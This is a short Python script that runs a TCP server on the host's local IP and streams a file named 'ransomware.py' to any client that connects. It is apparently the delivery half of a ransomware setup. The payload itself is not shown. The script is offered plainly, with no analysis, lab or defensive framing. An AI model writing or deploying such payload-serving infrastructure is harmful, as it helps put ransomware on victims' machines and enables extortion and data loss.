#!/usr/bin/python3
import socket
from sys import argv
import netifaces

def get_local_ip():
    interfaces = netifaces.interfaces()
    for interface_name in interfaces:
        interface = netifaces.ifaddresses(interface_name)
        try:
            normal_internet = interface[netifaces.AF_INET][0]
            address = normal_internet['addr']
            if address[0:3] != '127':
                return address
        except KeyError:
            continue

if __name__ == '__main__':
    host = get_local_ip()
    port = int(argv[1])
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print('The server is listening...')

    while True:
        conn, addr = s.accept()
        print('New connection from ', addr)
        filename = 'ransomware.py'
        f = open(filename, 'rb')
        l = f.read(1024)
        while(l):
            conn.send(l)
            print('Fragment sent.')
            l = f.read(1024)
        f.close()
        print('File transfer done!')
        conn.close()
